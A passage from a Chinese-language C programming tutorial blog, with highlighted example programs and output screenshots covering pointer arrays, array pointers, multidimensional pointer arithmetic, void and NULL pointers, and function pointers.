class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811113333044.png" alt="输出结果" style="zoom:67%;"><h4 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h4><p>存放都是指针的数组</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str[] = {<span class="string">"ab"</span>, <span class="string">"cd"</span>, <span class="string">"ef"</span>};</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"=======\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, *(str + i)); <span class="comment">// str为"ab"的指针，所以取值对指针加减后取</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(str + i));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"=======\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811113249562.png" alt="输出结果" style="zoom:67%;"><h4 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h4><p>存放数组指针的指针</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"><span class="type">int</span> temp[] = {<span class="number">1</span>,<span class="number">5</span>,<span class="number">63</span>};</span><br><span class="line"><span class="type">int</span>(*str)[] = &amp;temp;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span> ;i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"=======\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(*str + i)); <span class="comment">// *str为数组地址，所以*取数组地址的值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *str + i); </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"=======\n"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811113042205.png" alt="输出结果" style="zoom:67%;"><h4 id="二维数组与指针"><a href="#二维数组与指针" class="headerlink" title="二维数组与指针"></a>二维数组与指针</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>][<span class="number">4</span>] = {<span class="number">0</span>}, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            num[i][j] = ++count;</span><br><span class="line">            <span class="comment">// printf("%d\n", num[i][j]);</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"int size: %lu\n"</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num size: %lu\n"</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num len: %lu\n"</span>, <span class="keyword">sizeof</span>(num) / <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num addr: %p\n"</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0] addr : %p\n"</span>, *(num)); <span class="comment">// 指针指向数组第一个值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0] value : %d\n"</span>, **(num));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0] addr : %p\n"</span>, *(num + <span class="number">1</span>)); <span class="comment">// 指针加一依次指向每行第一个值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0] value : %d\n"</span>, **(num + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][0] addr : %p\n"</span>, *(num + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][0] value : %d\n"</span>, **(num + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][1] value : %d\n"</span>, *(*(num + <span class="number">2</span>) + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811113008696.png" alt="输出结果" style="zoom:67%;"><h4 id="数组指针与指针"><a href="#数组指针与指针" class="headerlink" title="数组指针与指针"></a>数组指针与指针</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>][<span class="number">4</span>] = {<span class="number">0</span>}, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            num[i][j] = ++count;</span><br><span class="line">            <span class="comment">// printf("%d\n", num[i][j]);</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>(*p)[<span class="number">4</span>] = num;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num addr: %p\n"</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0] addr : %p\n"</span>, *p); <span class="comment">// 指针地址为数组的第一项地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0] value : %d\n"</span>, **p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0] addr : %p\n"</span>, *(p + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0] addr : %p\n"</span>, *(num + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0] value : %d\n"</span>, **(p + <span class="number">1</span>)); <span class="comment">// 与上面二维数组一样</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][0] addr : %p\n"</span>, *(p + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][0] value : %d\n"</span>, **(p + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][1] value : %d\n"</span>, **(p + <span class="number">2</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811112923777.png" alt="输出结果" style="zoom:67%;"><h5 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h5><ul><li>数组的指针以第一维度作为跨度，加减会移动到下一跨度的首位</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*(array + i) == array[i] </span><br><span class="line">*(*(array + i) + j) == array[i][j]</span><br><span class="line">*(*(*(array + i) + j) + k) == array[i][j][k]</span><br></pre></td></tr></tbody></table></figure><p>例子：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num[<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>] = {<span class="number">0</span>}, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">            {</span><br><span class="line">                num[i][j][k] = ++count;</span><br><span class="line">                <span class="comment">// printf("num[%d][%d][%d]--&gt; %d --&gt; %p\n", i, j, k, num[i][j][k], &amp;num[i][j][k]);</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (<span class="type">int</span>)(**num - **(num + <span class="number">1</span>)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num addr: %p\n"</span>, **num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0][0] addr : %p\n"</span>, **num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[0][0][0] value : %d\n"</span>, ***num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0][0] addr : %p\n"</span>, **(num + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[1][0][0] value : %d\n"</span>, ***(num + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][0][0] addr : %p\n"</span>, **(num + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][3][4] value : %d\n"</span>, *(*(*(num + <span class="number">2</span>) + <span class="number">3</span>) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num[2][3][4] value : %d\n"</span>, num[<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220811112844751.png" alt="输出结果" style="zoom: 67%;"><h4 id="void类型指针"><a href="#void类型指针" class="headerlink" title="void类型指针"></a>void类型指针</h4><p>可指向任意类型的指针（需要做好强转的准备）</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> *num = &amp;n;</span><br><span class="line">    <span class="type">char</span> *str = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="type">void</span> *a;</span><br><span class="line">    a = num;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a addr --&gt; %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a value --&gt; %d\n"</span>, *(<span class="type">int</span> *)a); <span class="comment">// 注意要强转</span></span><br><span class="line"></span><br><span class="line">    a = str;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a addr --&gt; %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a value --&gt; %s\n"</span>, (<span class="type">char</span> *)a); <span class="comment">// 注意要强转</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220812011538493.png" alt="运行结果" style="zoom:67%;"><h4 id="NULL类型指针"><a href="#NULL类型指针" class="headerlink" title="NULL类型指针"></a>NULL类型指针</h4><p>用于初始化指针，可防止解引用后错误的指向随机地址</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *num = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num addr %d\n"</span>, *num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220812011918351.png" alt="运行结果" style="zoom:67%;"><h4 id="指向指针的指针"><a href="#指向指针的指针" class="headerlink" title="指向指针的指针"></a>指向指针的指针</h4><p>优点：避免重复分配内存，便于修改</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *str[<span class="number">5</span>] = {<span class="string">"admin"</span>, <span class="string">"password"</span>, <span class="string">"test"</span>, <span class="string">"user"</span>, <span class="string">"audio"</span>};</span><br><span class="line">    <span class="type">char</span> **my[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        my[i] = &amp;str[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"------------------\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d]str field: %s, addr is %p\n"</span>, i, str[i], str[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d]my  field: %s, addr is %p\n"</span>, i, *my[i], *my[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220812020541285.png" alt="运行结果" style="zoom:67%;"><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>先定义，再调用</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_c</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_c</span><span class="params">()</span>{</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello world\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>{</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="函数与之指针"><a href="#函数与之指针" class="headerlink" title="函数与之指针"></a>函数与之指针</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_res</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp = *b;</span><br><span class="line">    *b = *a;</span><br><span class="line">    *a = temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_res</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a:%2d,b:%2d\n"</span>, *a, *b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">6</span>;</span><br><span class="line">    print_res(&amp;a, &amp;b);</span><br><span class="line">    swap(&amp;a, &amp;b);</span><br><span class="line">    print_res(&amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220812112345951.png" alt="运行结果" style="zoom:150%;"><h4 id="函数与数组"><a href="#函数与数组" class="headerlink" title="函数与数组"></a>函数与数组</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr</span><span class="params">(<span class="type">int</span> a[<span class="number">10</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arr</span><span class="params">(<span class="type">int</span> a[<span class="number">10</span>])</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"in arr sizeof: %lu\n"</span>, <span class="keyword">sizeof</span> a[<span class="number">10</span>]);</span><br><span class="line">    a[<span class="number">5</span>] = <span class="number">10</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"in main sizeof: %lu\n"</span>, <span class="keyword">sizeof</span> <span class="built_in">array</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"array[%d]: %d\n"</span>, i, <span class="built_in">array</span>[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------------\n"</span>);</span><br><span class="line">    arr(<span class="built_in">array</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"array[%d]: %d\n"</span>, i, <span class="built_in">array</span>[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220812125542157.png" alt="运行结果"></p><h4 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">getWord</span><span class="params">(<span class="type">char</span>)</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">getWord</span><span class="params">(<span class="type">char</span> a)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">switch</span> (a)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Apple\n"</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"None\n"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input a char:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, getWord(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220814120349410.png" alt="结果" style="zoom: 67%;"><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>函数会返回地址值</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">scap</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scap</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> num * num;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">int</span> (*fp)(<span class="type">int</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input a int number:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line">    fp = scap; <span class="comment">// 赋值函数地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"number * number = %d * %d = %d\n"</span>, num, num, (*fp)(num));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220814110938587.png" alt="结果" style="zoom:67%;"><h4 id="函数指针作为参数"><a href="#函数指针作为参数" class="headerlink" title="函数指针作为参数"></a>函数指针作为参数</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> (*)(), <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> (*fun)(<span class="type">int</span>, <span class="type">int</span>), <span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)(*fun)(a, b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num1 = <span class="number">3</span>, num2 = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d + %d = %d\n"</span>, num1, num2, calc(add, num1, num2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d - %d = %d\n"</span>, num1, num2, calc(sub, num1, num2));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220814111009721.png" alt="image-20220814111009721"></p><h4 id="函数指针作为返回值"><a href="#函数指针作为返回值" class="headerlink" title="函数指针作为返回值"></a>函数指针作为返回值</h4><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> (*)(<span class="type">int</span>, <span class="type">int</span>), <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*select(<span class="type">char</span>))(); <span class="comment">// 定义返回值为函数指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> (*fun)(<span class="type">int</span>, <span class="type">int</span>), <span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> (*fun)(a, b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*select(<span class="type">char</span> c))() <span class="comment">// 定义返回值为函数指针</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">switch</span> (c)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">        <span class="keyword">return</span> add;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> sub;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 